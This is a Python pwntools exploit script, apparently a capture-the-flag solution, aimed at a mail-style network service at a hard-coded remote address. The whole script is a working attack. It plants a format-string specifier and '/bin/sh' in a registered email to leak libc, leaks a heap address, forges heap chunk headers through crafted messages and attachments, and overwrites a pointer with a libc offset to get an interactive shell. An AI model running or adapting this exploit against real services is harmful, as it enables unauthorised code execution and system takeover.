from pwn import *
context.log_level ='debug'
HOST = "54.180.66.117"
PORT = 8282
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def reg(email, pw):
  s.sendline("REG")
  s.recvuntil("EMAIL:")
  s.send(email)
  s.recvuntil("PASS:")
  s.send(pw)
  s.recvuntil("200 - REGISTER")
def login(email,pw):
  s.sendline("LOGIN")
  s.recvuntil("EMAIL:")
  s.send(email)
  s.recvuntil("PASS:")
  s.send(pw)
  s.recvuntil("200 - LOGIN!")
def logout():
  s.sendline("LOGOUT")
def send(to, sub, body, attach, size=0, dat=""):
  s.sendline("SEND")
  s.recvuntil("To:")
  s.send(to)
  s.recvuntil("Subject:")
  s.send(sub)
  s.recvuntil("Body:")
  s.send(body)
  s.recvuntil("(1/2)")
  if(attach == 1):
    s.sendline("1")
    s.recvuntil("size:")
    s.sendline(str(size))
    s.recvuntil("File:")
    s.send(dat)
    s.recvuntil("(1/2)")
    s.sendline("2")
  else:
    s.sendline("2")
def send_modify(to, sub, body, attach, size=0, dat=""):
  s.sendline("SEND")
  s.recvuntil("To:")
  s.send(to)
  s.recvuntil("Subject:")
  s.send(sub)
  s.recvuntil("Body:")
  s.send(body)
  s.recvuntil("(1/2)")
  if(attach == 1):
    s.sendline("1")
    s.recvuntil("size:")
    s.sendline(str(size))
    s.recvuntil("File:")
    s.send(dat)
    s.recvuntil("(1/2)")
    s.sendline("1")
  else:
    s.sendline("2")
def trash(index):
  s.sendline("TRASH")
  time.sleep(0.5)
  s.sendline(str(index))
  s.recvuntil("OK")
def recv():
  s.sendline("RECV")

s.recvuntil("Library: Glibc\n")
reg("rapid@pwn%107$llx;/bin/sh\x00","1234")
login("rapid@pwn%107$llx;/bin/sh\x00","1234")
send("1234","1234","A"*0x28,1,0x10,"ABCD")
recv()
s.recvuntil("A"*0x28)
heap = u64(s.recv(4)+"\x00"*4) - 0xe0
print hex(heap)
send(p64(0x00)+p64(0x61),"1234","A"*0x18+p64(0x21)*2,0)
#logout()
#reg("rapid@pwn","1234")
time.sleep(0.5)
s.send("\x00"*0x8+p64(heap+0x110))
trash(11)
trash(1)
send_modify(p64(0x00)+p64(0x61),p64(0),"A"*0x20,1,0x50,"A"*(0x4f-7)+p64(0x0004008D8)[:-1])
s.recvuntil("pwn")
libc = int(s.recv(12),16)-0x55899
print hex(libc)
send(p64(0x00)+p64(0x61),"1234","A"*0x18+p64(0x21)*2,0)
time.sleep(0.5)
raw_input('d')
s.send("\x00"*8+p64(heap+0x180))
trash(11)
trash(3)
send_modify(p64(0x00)+p64(0x61),p64(0),"A"*0x20,1,0x50,"A"*(0x4f-7)+p64(libc+0x45390)[:-1])
s.interactive()
